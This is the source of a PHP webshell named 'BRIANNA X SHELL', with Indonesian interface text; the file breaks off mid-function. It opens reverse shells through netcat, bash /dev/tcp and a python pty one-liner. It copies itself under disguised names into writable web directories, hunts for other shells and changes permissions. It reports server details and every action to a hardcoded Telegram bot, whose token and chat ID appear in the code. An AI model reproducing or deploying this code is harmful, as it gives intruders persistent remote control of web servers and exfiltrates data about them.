<?php
session_start();
@error_reporting(0);
@ini_set('display_errors', 0);
@set_time_limit(0);
@clearstatcache();
@ignore_user_abort(true);

$encoded_user = 'NTI0OTIxZDYzY2NmMmQ3MDFiN2U0NDlmOTljMzg0NzA='; 
$valid_user   = @base64_decode($encoded_user);

$encoded_pass = 'NzhjYTNjMzBlMDRiMDNmM2E0YzNhOTU0YWVlNmQ0Zjc=';
$valid_pass   = @base64_decode($encoded_pass);

$spread_link_file = '/tmp/.chache/.cache.log';

const WEBSHELL_VERSION = '3.1';

const TELEGRAM_BOT_TOKEN = '8148697352:AAFXN8cB3cj2vO3YaBzZOy0HFNSi966QMXM';
const TELEGRAM_CHAT_ID = '5608889609';
const MAX_TELEGRAM_LENGTH = 4000;

$current_script_path = @realpath($_SERVER['SCRIPT_FILENAME'] ?? '');
$current_script_name_for_finder = basename($current_script_path);

$source_file_content = @file_get_contents($current_script_path);

function get_base_url() {
    $protocol = (@$_SERVER["HTTPS"] == "on" || @$_SERVER["SERVER_PORT"] == 443) ? "https://" : "http://";
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'];
    return $protocol . $host;
}

function get_web_url_from_path($local_path) {
    if (empty($local_path)) {
        return 'N/A - Empty Path';
    }

    $resolved_path = @realpath($local_path);
    if (!$resolved_path) {
        return 'N/A - Path not found';
    }

    $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
    $base_url = get_base_url();

    if (!empty($document_root) && @strpos($resolved_path, $document_root) === 0) {
        $relative_path_segmentary = str_replace($document_root, '', $resolved_path);
        $relative_path_final = ltrim($relative_path_segmentary, DIRECTORY_SEPARATOR);

        $path_segments = @explode(DIRECTORY_SEPARATOR, $relative_path_final);
        $encoded_path = @implode('/', @array_map('rawurlencode', $path_segments));

        return $base_url . '/' . $encoded_path;
    }

    return 'N/A - Not under Document Root';
}


function send_telegram_report($message, $parse_mode = 'HTML') {
    if (!@defined('TELEGRAM_BOT_TOKEN') || !@defined('TELEGRAM_CHAT_ID') || @TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN' || @TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID') {
        return false;
    }

    $message_blocks = array();
    $MAX_LENGTH = @defined('MAX_TELEGRAM_LENGTH') ? MAX_TELEGRAM_LENGTH : 4000;

    if (@strlen($message) > $MAX_LENGTH) {
        $lines = @explode("\n", $message);
        $current_block = '';
        foreach ($lines as $line) {
            if (@strlen($current_block) + @strlen($line) + 1 > $MAX_LENGTH) {
                if (!empty($current_block)) {
                    $message_blocks[] = $current_block;
                }
                $current_block = $line . "\n";
            } else {
                $current_block .= $line . "\n";
            }
        }
        if (!empty($current_block)) {
            $message_blocks[] = $current_block;
        }

    } else {
        $message_blocks[] = $message;
    }

    $success = true;

    foreach ($message_blocks as $block) {
        $url = 'https://api.telegram.org/bot' . TELEGRAM_BOT_TOKEN . '/sendMessage';
        $params = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $block,
            'parse_mode' => $parse_mode,
            'disable_web_page_preview' => true
        ];

        $ch = @curl_init();
        if ($ch) {
            @curl_setopt($ch, CURLOPT_URL, $url);
            @curl_setopt($ch, CURLOPT_POST, 1);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
            @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            $result = @curl_exec($ch);
            @curl_close($ch);
            if ($result === false) { $success = false; }
            @usleep(200000);
        }

        if (!$ch && @ini_get('allow_url_fopen')) {
            $query_string = @http_build_query($params);
            $context_options = [
                'http' => [
                    'method'  => 'POST',
                    'header'  => 'Content-type: application/x-www-form-urlencoded',
                    'content' => $query_string,
                    'timeout' => 5
                ]
            ];
            $context  = @stream_context_create($context_options);
            $result = @file_get_contents($url, false, $context);
            if ($result === false) { $success = false; }
            @usleep(200000);
        }
    }

    return $success;
}

function get_initial_info() {
    $current_domain = $_SERVER['HTTP_HOST'] ?? 'Unknown Host';
    $shell_url = get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/');
    $os_info = @php_uname();
    $php_version = @phpversion();
    $server_ip = @$_SERVER['SERVER_ADDR'] ?? @gethostbyname($current_domain);
    $user_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown User IP';

    $report_message = "<b>\u{1F4BB} ACCESS REPORT: BRIANNA X SHELL</b>\n";
    $report_message .= "==============================\n";
    $report_message .= "<b>URL Shell:</b> <a href=\"{$shell_url}\">{$shell_url}</a>\n";
    $report_message .= "<b>IP Server:</b> <code>{$server_ip}</code>\n";
    $report_message .= "<b>OS Server:</b> <code>{$os_info}</code>\n";
    $report_message .= "<b>PHP Version:</b> <code>{$php_version}</code>\n";
    $report_message .= "<b>Akses Dari IP:</b> <code>{$user_ip}</code>\n";
    $report_message .= "==============================\n";
    $report_message .= "<b>Waktu:</b> " . @date('Y-m-d H:i:s') . "\n";

    return $report_message;
}

function deleteRecursive($target)
{
  if (@is_dir($target)) {
    $items = @scandir($target);
    foreach ($items as $item) {
      if ($item === '.' || $item === '..')
        continue;
      deleteRecursive($target . DIRECTORY_SEPARATOR . $item);
    }
    @rmdir($target);
  } else {
    @unlink($target);
  }
}

function get_perms_string($file) {
    if (!@file_exists($file)) return '----------';
    $perms = @fileperms($file);
    if ($perms === false) return '----------';

    $info = (($perms & 0x4000) ? 'd' : '-');
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? 'x' : '-');
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? 'x' : '-');
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? 'x' : '-');

    return $info;
}

function generate_random_filename() {
    $characters = 'abcdefghijklmnopqrstuvwxyz';
    $random_string = '';
    $length = 12;

    $char_length = @strlen($characters) - 1;
    for ($i = 0; $i < $length; $i++) {
        $random_string .= $characters[@mt_rand(0, $char_length)];
    }

    $prefixes = ['cache_', 'temp_', 'config_', 'session_', 'data_', 'module_'];
    $prefix = $prefixes[@array_rand($prefixes)];

    return $prefix . $random_string . '.php';
}

function nc_reverse_shell($ip, $port) {
    $nc_binaries = [
        'nc',
        'netcat',
        '/usr/bin/nc',
        '/usr/bin/netcat',
        '/usr/local/bin/nc',
        '/usr/local/bin/netcat',
        '/bin/nc',
        '/bin/netcat',
    ];

    $found_nc = null;
    $command_exec_function = null;

    if (@function_exists('shell_exec')) {
        $command_exec_function = 'shell_exec';
    } elseif (@function_exists('passthru')) {
        $command_exec_function = 'passthru';
    } else {
        return false;
    }

    foreach ($nc_binaries as $nc) {
        $check_cmd = "which " . escapeshellarg($nc);
        $output = '';
        if ($command_exec_function === 'shell_exec') {
            $output = @shell_exec($check_cmd);
        } elseif ($command_exec_function === 'passthru') {
            @ob_start();
            @passthru($check_cmd . ' 2>&1', $return_var);
            $output = @ob_get_clean();
            if ($return_var !== 0) $output = '';
        }

        if (!empty(trim($output))) {
            $found_nc = trim($output);
            break;
        }
    }

    if (!$found_nc) {
        foreach (['nc', 'netcat'] as $nc_fallback) {
             if ($command_exec_function === 'shell_exec') {
                 $output = @shell_exec(escapeshellarg($nc_fallback) . ' -h 2>&1');
                 if (!empty($output) && (@strpos($output, 'usage') !== false || @strpos($output, 'Usage:') !== false)) {
                     $found_nc = $nc_fallback;
                     break;
                 }
             } elseif ($command_exec_function === 'passthru') {
                 @ob_start();
                 @passthru(escapeshellarg($nc_fallback) . ' -h 2>&1', $return_var);
                 $output = @ob_get_clean();
                 if ($return_var == 0 && !empty($output) && (@strpos($output, 'usage') !== false || @strpos($output, 'Usage:') !== false)) {
                     $found_nc = $nc_fallback;
                     break;
                 }
             }
        }
    }

    if ($found_nc) {

        $ip_esc = escapeshellarg($ip);
        $port_esc = escapeshellarg($port);

        $nc_cmd_e = "nohup " . escapeshellarg($found_nc) . " {$ip_esc} {$port_esc} -e /bin/bash > /dev/null 2>&1 &";

        $fifo_name = '/tmp/.fifo_' . uniqid();
        $pipe_cmd = "mkfifo " . escapeshellarg($fifo_name) . " && " . escapeshellarg($found_nc) . " {$ip_esc} {$port_esc} < " . escapeshellarg($fifo_name) . " | /bin/bash > " . escapeshellarg($fifo_name) . " 2>&1 &";

        $success = false;

        if ($command_exec_function === 'shell_exec') {
            @shell_exec($nc_cmd_e);
            $success = true;
        } elseif ($command_exec_function === 'passthru') {
            @passthru($nc_cmd_e, $return_var_e);
            $success = ($return_var_e === 0);
        }

        if (!$success) {
            if ($command_exec_function === 'shell_exec') {
                 @shell_exec($pipe_cmd);
                 $success = true;
            } elseif ($command_exec_function === 'passthru') {
                 @passthru($pipe_cmd, $return_var_pipe);
                 $success = ($return_var_pipe === 0);
            }
        }

        return $success ? ($found_nc . " (Netcat)") : false;
    }

    return false;
}

function scan_dir_for_shells($dir, $current_depth = 0) {
    global $suspicious_keywords, $found_shells, $max_depth, $current_script_path, $source_file_content, $document_root, $base_url;

    if ($current_depth >= $max_depth) return;

    $items = @scandir($dir);
    if (!$items) return;

    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;

        $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;

        if (@is_dir($path)) {
            if (@realpath($path) != @realpath(dirname($path))) {
               scan_dir_for_shells($path, $current_depth + 1);
            }
        } elseif (@preg_match('/\.(php|phtml|asp|aspx)$/i', $item)) {
            $content = @file_get_contents($path);

            if (!empty($source_file_content) && $content === $source_file_content) {
                continue;
            }

            $resolved_path = @realpath($path) ? @realpath($path) : $path;
            if (!empty($current_script_path) && $resolved_path === $current_script_path) {
                continue;
            }

            if ($content !== false && $content !== '') {
                foreach ($suspicious_keywords as $keyword) {
                    if (@stripos($content, $keyword) !== false) {

                        $web_url = get_web_url_from_path($resolved_path);

                        $found_shells[] = ['url' => $web_url, 'match' => $keyword, 'path' => $path];
                        break;
                    }
                }
            }
        }
    }
}


if (isset($_POST['reverse_shell'])) {
    $ip = $_POST['ip'];
    $port = intval($_POST['port']);

    @ob_clean();

    if (!filter_var($ip, FILTER_VALIDATE_IP) || $port < 1 || $port > 65535) {
        echo "❌ Invalid IP or port";
        exit;
    }

    $rs_status = "❌ No suitable method available. Functions shell_exec/passthru might be disabled.";
    $rs_method = "Failed";

    $nc_method = @nc_reverse_shell($ip, $port);
    if ($nc_method) {
        $rs_status = "✅ Reverse shell initiated via Netcat, Method: {$nc_method} to {$ip}:{$port}";
        $rs_method = $nc_method;
    }

    elseif (@function_exists('shell_exec')) {
        $cmd = "nohup /bin/bash -i >& /dev/tcp/" . escapeshellarg($ip) . "/" . escapeshellarg($port) . " 0>&1 &";
        @shell_exec($cmd);
        $rs_status = "✅ Reverse shell initiated via bash: {$ip}:{$port}";
        $rs_method = "Bash /dev/tcp";
    }
    elseif (@function_exists('passthru')) {
         $ip_q = escapeshellarg($ip);
         $port_q = escapeshellarg($port);
         $cmd = "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((". $ip_q . "," . $port_q . "));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")' 2>&1";

         ob_start();
         @passthru($cmd, $return_var);
         $output = ob_get_clean();

         $rs_status = "✅ Reverse shell initiated via Python with pty: {$ip}:{$port}";
         $rs_method = "Python pty";
    }

    $report_message = "\u{1F4E1} <b>REVERSE SHELL INITIATED!</b>\n";
    $report_message .= "==============================\n";
    $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
    $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
    $report_message .= "<b>Target IP (Listen):</b> <code>{$ip}</code>\n";
    $report_message .= "<b>Target Port:</b> <code>{$port}</code>\n";
    $report_message .= "<b>Method:</b> <code>{$rs_method}</code>\n";
    $report_message .= "<b>Status:</b> " . (strpos($rs_status, '✅') !== false ? 'SUCCESS' : 'FAILURE') . "\n";
    send_telegram_report($report_message);

    echo $rs_status;
    exit;
}

if (isset($_GET['shell_finder']) && isset($_GET['ajax'])) {

    $suspicious_keywords = ['eval(', 'file_get_contents(', 'curl_exec(', 'base64_decode(', 'system(', 'shell_exec(', 'passthru(', 'assert(', 'include(', 'require(', 'fopen(', 'readfile(', 'exec(', 'proc_open(', 'popen(', 'create_function(', 'unserialize(', 'call_user_func(', 'file_put_contents(', 'unlink(', 'rmdir(', 'symlink(', '$_POST', '$_GET', '$_REQUEST', '$_COOKIE', '$_FILES'];
    $found_shells = [];
    $max_depth = 5;
    $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');
    $base_url = get_base_url();

    $start_dir = $_SERVER['DOCUMENT_ROOT'] ?? @getcwd();

    if (@is_dir($start_dir) && @is_readable($start_dir)) {
      echo "<h3>🔎 Shell Finder Results</h3>";
      echo "<p>Scanning **Document Root** (<code>" . htmlspecialchars($document_root) . "</code>) dan {$max_depth} levels deep. (I have permission and am authorized to perform this pentest).</p>";
      echo "<p style='color: #0088ff;'>* Filter Self-Scan Aktif: Webshell utama dan semua salinannya telah diabaikan dari hasil.</p>";

      scan_dir_for_shells(@rtrim($start_dir, DIRECTORY_SEPARATOR));

      if (count($found_shells) > 0) {
          $web_url_shells = @array_filter($found_shells, function($shell_data) {
              return @strpos($shell_data['url'], 'http') === 0 || @strpos($shell_data['url'], 'https') === 0;
          });
          $web_count = count($web_url_shells);
          $shells_count = count($found_shells);
          echo "<p style='color: #fff;'>Ditemukan <b>" . $shells_count . "</b> file mencurigakan, <b>{$web_count}</b> dapat dikonversi ke URL web:</p>";
          echo "<div style='max-height: 400px; overflow-y: scroll; background: #000; padding: 10px; border: 1px solid #00ff00ff;'>";

          echo "<p style='color:#00ff7f;'><b>URL Web Shell yang Ditemukan (Untuk Browser):</b></p>";
          echo "<textarea style='width:100%; height:100px; background:#111; color:#fff; border:1px solid #00ff00ff;'>";
          foreach ($web_url_shells as $shell) {
             echo htmlspecialchars($shell['url']) . "\n";
          }
          echo "</textarea>";

          echo "<p style='margin-top:15px; color:ffcc00;'><b>Detail Path Lokal + Keyword Match:</b></p>";
          echo "<table style='width: 100%; color: white; border-collapse: collapse; font-size: 11px;'>";
          echo "<tr><th style='text-align: left;'>Path (Lokal)</th><th style='text-align: left;'>Keyword Match</th></tr>";

          foreach ($found_shells as $shell) {
              $path_display = @strpos($shell['url'], 'LOCAL_PATH:') === 0 ? @str_replace('LOCAL_PATH: ', '', $shell['url']) : htmlspecialchars($shell['path']);
              echo "<tr><td style='border-top: 1px dashed #333;'><code>" . $path_display . "</code></td><td style='border-top: 1px dashed #333; color: #ffcc00;'>{$shell['match']}</td></tr>";
          }
          echo "</table>";
          echo "</div>";

      } else {
          echo "<p style='color: #00ff7f;'>Tidak ada file shell mencurigakan yang ditemukan.</p>";
      }

    } else {
      echo "<h3>🔎 Shell Finder Results</h3>";
      echo "<p style='color: #ffcc00;'>⚠️ ERROR: Server tidak dapat menentukan Document Root. Pemindaian tidak dapat menghasilkan URL Web. Document Root/Start Dir: " . htmlspecialchars($start_dir) . "</p>";
    }

    exit;
}

if (isset($_GET['defense_shell']) && isset($_GET['ajax'])) {

    global $spread_link_file, $current_script_path;

    $writable_paths = [];
    $spread_links = [];
    $max_depth = 5;
    $base_url = get_base_url();

    $max_spread_limit = 20;

    $spread_counter = 0;
    $remaining_limit = 0;

    $link_file_path = $spread_link_file;

    if (!@is_dir('/tmp/.chache/')) {
       @mkdir('/tmp/.chache/', 0777, true);
    }

    $existing_links_content = @file_get_contents($link_file_path) ?: '';
    $existing_links_array = @array_filter(@array_map('trim', @explode("\n", $existing_links_content)));

    $existing_web_links_count = @count(@array_filter($existing_links_array, function($link) {
        return @strpos($link, 'http') === 0 || @strpos($link, 'https') === 0;
    }));

    $remaining_limit = $max_spread_limit - $existing_web_links_count;

    if ($remaining_limit < 0) {
        $remaining_limit = 0;
    }


    function scan_writable_dirs($dir, $current_depth = 0) {
        global $writable_paths, $max_depth, $current_script_path, $spread_links, $base_url, $spread_counter, $remaining_limit, $existing_links_array;

        if ($spread_counter >= $remaining_limit) return;

        if ($current_depth >= $max_depth) return;

        $document_root = @realpath($_SERVER['DOCUMENT_ROOT'] ?? '');

        $items = @scandir($dir);
        if (!$items) return;

        foreach ($items as $item) {

            if ($spread_counter >= $remaining_limit) return;

            if ($item == '.' || $item == '..') continue;
            
            if (@is_dir($dir . DIRECTORY_SEPARATOR . $item) && @strpos($item, '.') === 0) {
                continue;
            }

            $path = rtrim($dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;

            if (@is_dir($path)) {
                if (@is_writable($path)) {
                    
                    if ($spread_counter < $remaining_limit) {
                        $writable_paths[] = $path;

                        $random_name = generate_random_filename();
                        $target_shell_path = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $random_name;

                        if (@realpath($target_shell_path) == @realpath($current_script_path)) continue;

                        if (@copy($current_script_path, $target_shell_path)) {
                            @chmod($target_shell_path, 0644);

                            $current_link = get_web_url_from_path($target_shell_path);

                            if (@strpos($current_link, 'http') === 0 || @strpos($current_link, 'https') === 0 && !@in_array($current_link, $existing_links_array)) {
                                $spread_links[] = $current_link;
                                $spread_counter++;
                            } else if (@strpos($current_link, 'http') !== 0) {
                                $spread_links[] = "LOCAL_PATH_ONLY: " . $target_shell_path;
                            } else {
                                $spread_links[] = $current_link;
                            }
                        }
                    }
                }

                scan_writable_dirs($path, $current_depth + 1);
            }
        }
    }

    $start_dir = $_SERVER['DOCUMENT_ROOT'] ?? @getcwd();

    $output_html = "<h3>🛡️ Defense Shell - **File Spread Mode**</h3>";

    if (@is_dir($start_dir) && @is_readable($start_dir)) {

        if ($remaining_limit > 0) {
           scan_writable_dirs(@rtrim($start_dir, DIRECTORY_SEPARATOR));
        }

        $all_spread_links = @array_values(@array_unique(@array_merge($existing_links_array, $spread_links)));

        $pure_web_links = @array_filter($all_spread_links, function($link) {
            return @strpos($link, 'http') === 0 || @strpos($link, 'https') === 0;
        });

        if (count($pure_web_links) > $max_spread_limit) {
            $pure_web_links = array_slice($pure_web_links, 0, $max_spread_limit);
            $log_links_temp = array_filter($all_spread_links, function($link) {
                 return @strpos($link, 'LOCAL_PATH_ONLY:') === 0;
            });
            $all_spread_links = @array_merge($pure_web_links, $log_links_temp);
        }

        $newly_spread_links = @array_filter($spread_links, function($link) use ($existing_links_array) {
           return (@strpos($link, 'http') === 0 || @strpos($link, 'https') === 0)
                  && !@in_array($link, $existing_links_array);
        });
        $newly_spread_links_count = @count($newly_spread_links);
        $link_count = @count($pure_web_links);


        $log_links_content_for_file = implode("\n", $all_spread_links);

        $spread_successful = false;

        $is_links_logged = !empty($log_links_content_for_file)
                            ? @file_put_contents($link_file_path, $log_links_content_for_file . "\n", @LOCK_EX)
                            : (empty($existing_links_array) ? true : false);

        if ($is_links_logged !== false) {
             $spread_successful = true;
        }

        $collected_web_links = [];

        if (!empty($pure_web_links)) {
            foreach ($pure_web_links as $link) {
                 $collected_web_links[] = "<a href=\"{$link}\">{$link}</a>";
            }
        }

        $message_content = @implode("\n", $collected_web_links);

        if (!empty($message_content)) {
            $initial_report = "\u{1F6E1} <b>DEFENSE SHELL SPREAD REPORT</b>\n";
            $initial_report .= "Shell URL: <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
            $initial_report .= "Semua Link Unik Ditemukan (Max {$max_spread_limit}): " . $link_count . "\n";
            $initial_report .= "=================================\n";

            send_telegram_report($initial_report . $message_content, 'HTML');
        }

        if ($spread_successful) {

            $output_html .= "<p style='color: #00ff7f;'>✅ **File Spread Selesai!**</p>";

            if ($link_count > 0) {
                 $real_link_path = htmlspecialchars(@realpath($link_file_path));

                 $limit_message = ($max_spread_limit <= $existing_web_links_count)
                    ? "Batas maksimal **{$max_spread_limit}** sudah tercapai. Total link unik di log: {$link_count}."
                    : "Webshell berhasil disebar ke **{$newly_spread_links_count}** lokasi baru! Total link unik di log: {$link_count} (Batas Max: {$max_spread_limit}).";

                 $output_html .= "<p style='color: #00ff7f;'>{$limit_message}</p>";
                 $output_html .= "<p style='color: #ffcc00;'>Daftar URL lengkap (termasuk path lokal) tersedia di:** <code>" . $real_link_path . "</code></p>";

                 $output_html .= "<br><p style='color: #00ff7f; margin-top: 15px;'>**Salin Semua URL Berikut (Total Log - Unik):**</p>";
                 $output_html .= "<textarea id='spreadLinksContent' style='width: 100%; min-height: 200px; background: #111; color: #fff; border: 1px solid #00ff00ff; padding: 10px; font-size: 12px; font-family: monospace;'>";

                 $output_html .= @htmlspecialchars(@trim(@implode("\n", $pure_web_links)));

                 $output_html .= "</textarea>";
            } else {
                 $output_html .= "<p style='color: #ffcc00;'>⚠️ **Penyebaran file GAGAL atau TIDAK ADA** direktori yang dapat ditulisi di bawah Document Root dalam batas kedalaman ({$max_depth}).</p>";
            }

        } else {
             $output_html .= "<p class='error' style='color: #ff3333;'>❌ ERROR: Gagal menulis salah satu file log.</p>";
        }
    } else {
         $output_html .= "<p class='error' style='color: #ff3333;'>❌ ERROR: Tidak dapat membaca DOCUMENT_ROOT (" . htmlspecialchars($start_dir) . "). Pemindaian dibatalkan.</p>";
    }

    echo $output_html;

    exit;
}

if (isset($_GET['chmod_modal']) && isset($_GET['ajax'])) {
    $file = $_GET['chmod_modal'];
    $currentPerm = @substr(sprintf("%o", @fileperms($file)), -4);
    echo "<h3>Ubah Permission: " . htmlspecialchars(basename($file)) . "</h3>
    <form method='post' onsubmit='submitChmod(event)'>
        <input type='text' id='newPerm' value='$currentPerm' placeholder='0777' required>
        <input type='hidden' id='targetFile' value='" . htmlspecialchars($file) . "'>
        <button type='submit'>Ubah</button>
    </form>
    <div id='chmodStatus'></div>";
    exit;
}

if (isset($_POST['do_chmod'])) {
    $file = $_POST['file'];
    $perm = (int) @base_convert($_POST['perm'], 8, 10);
    @ob_clean();
    if (@chmod($file, $perm)) {
        echo "OK";
    } else {
        echo "Gagal mengubah permission.";
    }
    exit;
}

if (isset($_FILES['upload_file'])) {
    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();

    $uploadSuccess = false;
    $finalName = '';
    $file_web_url = 'N/A';

    if (!@is_dir($currentDir)) $currentDir = @getcwd();
    $originalName = @basename($_FILES['upload_file']['name']);
    $target = $currentDir . DIRECTORY_SEPARATOR . $originalName;

    if (@file_exists($target)) {
        $pathInfo = @pathinfo($target);
        $basename = $pathInfo['filename'];
        $extension = @isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
        $counter = 1;
        do {
            $newName = $basename . '_copy' . $counter . $extension;
            $newTarget = $currentDir . DIRECTORY_SEPARATOR . $newName;
            $counter++;
        } while (@file_exists($newTarget));
        $target = $newTarget;
        $finalName = $newName;
    } else {
        $finalName = $originalName;
    }

    if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
        @chmod($target, 0666);
        $uploadSuccess = true;

        $file_web_url = get_web_url_from_path($target);
    }

    $report_message = "\u{1F4E5} <b>FILE UPLOADED!</b>\n";
    $report_message .= "==============================\n";
    $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
    $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
    $report_message .= "<b>File Name:</b> <code>" . htmlspecialchars($finalName) . "</code>\n";
    $report_message .= "<b>File URL:</b> <a href=\"" . htmlspecialchars($file_web_url) . "\">" . htmlspecialchars($file_web_url) . "</a>\n";
    $report_message .= "<b>Status:</b> " . ($uploadSuccess ? 'SUCCESS' : 'FAILURE') . "\n";
    send_telegram_report($report_message);

    $_SESSION['notification'] = [
        'type' => $uploadSuccess ? 'success' : 'error',
        'message' => 'File <b>' . htmlspecialchars($finalName) . '</b> ' . ($uploadSuccess ? 'berhasil diupload!' : 'gagal diupload!')
    ];
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();
    if (!@is_dir($currentDir)) $currentDir = @getcwd();
    $folder = $_POST['folder_name'];
    $target = $currentDir . DIRECTORY_SEPARATOR . $folder;
    $created = false;
    $folder_web_url = 'N/A';

    if (!@file_exists($target)) {
        if (@mkdir($target)) {
            @chmod($target, 0777);
            $created = true;
            $folder_web_url = get_web_url_from_path($target);

            $report_message = "\u{1F4C1} <b>FOLDER CREATED!</b>\n";
            $report_message .= "==============================\n";
            $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
            $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
            $report_message .= "<b>Folder Name:</b> <code>" . htmlspecialchars($folder) . "</code>\n";
            $report_message .= "<b>Folder URL:</b> <a href=\"" . htmlspecialchars($folder_web_url) . "\">" . htmlspecialchars($folder_web_url) . "</a>\n";
            $report_message .= "<b>Status:</b> SUCCESS\n";
            send_telegram_report($report_message);
        }
    }
    $_SESSION['notification'] = ['type' => $created ? 'success' : 'error', 'message' => 'Folder <b>' . htmlspecialchars($folder) . '</b> ' . ($created ? 'berhasil dibuat!' : 'gagal dibuat! (sudah ada?)')];
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
    $currentDir = isset($_GET['dir']) ? @realpath($_GET['dir']) : @getcwd();

    $file_web_url = 'N/A';

    if (!@is_dir($currentDir)) $currentDir = @getcwd();
    $file = $_POST['file_name'];
    $target = $currentDir . DIRECTORY_SEPARATOR . $file;
    $created = false;

    $finalName = $file;
    if (@file_exists($target)) {
        $pathInfo = @pathinfo($target);
        $basename = $pathInfo['filename'];
        $extension = @isset($pathInfo['extension']) ? '.' . $pathInfo['extension'] : '';
        $counter = 1;
        do {
            $newName = $basename . '_copy' . $counter . $extension;
            $newTarget = $currentDir . DIRECTORY_SEPARATOR . $newName;
            $counter++;
        } while (@file_exists($newTarget));
        $target = $newTarget;
        $finalName = $newName;
    }

    $handle = @fopen($target, 'w');
    if ($handle) {
        @fclose($handle);
        @chmod($target, 0666);
        $created = true;

        $file_web_url = get_web_url_from_path($target);

        $report_message = "\u{1F4C4} <b>FILE CREATED!</b>\n";
        $report_message .= "==============================\n";
        $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
        $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
        $report_message .= "<b>File Name:</b> <code>" . htmlspecialchars($finalName) . "</code>\n";
        $report_message .= "<b>File URL:</b> <a href=\"" . htmlspecialchars($file_web_url) . "\">" . htmlspecialchars($file_web_url) . "</a>\n";
        $report_message .= "<b>Status:</b> SUCCESS\n";
        send_telegram_report($report_message);
    }

    $_SESSION['notification'] = ['type' => $created ? 'success' : 'error', 'message' => 'File <b>' . htmlspecialchars($finalName) . '</b> ' . ($created ? 'berhasil dibuat!' : 'gagal dibuat!')];
    header("Location: ?dir=" . urlencode($currentDir));
    exit;
}

if (isset($_GET['rename']) && isset($_GET['ajax'])) {
    $old = $_GET['rename'];
    echo "<h3>Rename: " . htmlspecialchars(basename($old)) . "</h3>
    <form method='post' onsubmit='submitRename(event)'>
        <input type='text' id='newName' placeholder='Nama baru' value='" . htmlspecialchars(basename($old)) . "' required>
        <input type='hidden' id='oldPath' value='" . htmlspecialchars($old) . "'>
        <button type='submit'>Rename</button>
    </form>
    <div id='renameStatus'></div>";
    exit;
}

if (isset($_POST['do_rename'])) {
    $old = @realpath($_POST['old_path']);
    $newName = @basename($_POST['new_name']);
    $dir = @dirname($old);
    $new = $dir . DIRECTORY_SEPARATOR . $newName;
    $renamed = false;
    @ob_clean();
    if (@file_exists($old)) {
        if (@rename($old, $new)) {
            if (@is_file($new)) {
                @chmod($new, 0666);
            } else {
                @chmod($new, 0777);
            }
            $renamed = true;

            $new_web_url = get_web_url_from_path($new);

            $report_message = "\u{1F504} <b>FILE/DIR RENAMED!</b>\n";
            $report_message .= "==============================\n";
            $report_message .= "<b>Shell URL:</b> <a href=\"" . get_base_url() . ($_SERVER['REQUEST_URI'] ?? '/') . "\">" . get_base_url() . "</a>\n";
            $report_message .= "<b>Attacker IP:</b> <code>" . ($_SERVER['REMOTE_ADDR'] ?? 'N/A') . "</code>\n";
            $report_message .= "<b>Old Name:</b> <code>" . htmlspecialchars(basename($old)) . "</code>\n";
            $report_message .= "<b>New Name:</b> <code>" . htmlspecialchars($newName) . "</code>\n";
            $report_message .= "<b>File URL:</b> <a href=\"" . htmlspecialchars($new_web_url) . "\">" . htmlspecialchars($new_web_url) . "</a>\n";
            send_telegram_report($report_message);
        }
    }
    if ($renamed) {
        echo "OK";
    } else {
        echo "Gagal merubah nama file/folder.";
    }
    exit;
}


if (isset($_GET['delete'])) {
    $target = @realpath($_GET['delete']);
    $redirectDir = @isset($_GET['dir']) ? $_GET['dir'] : '';
    if ($target && @file_exists($target)) {
        
        $deleted_web_url = get_web_url_from_path($target); 

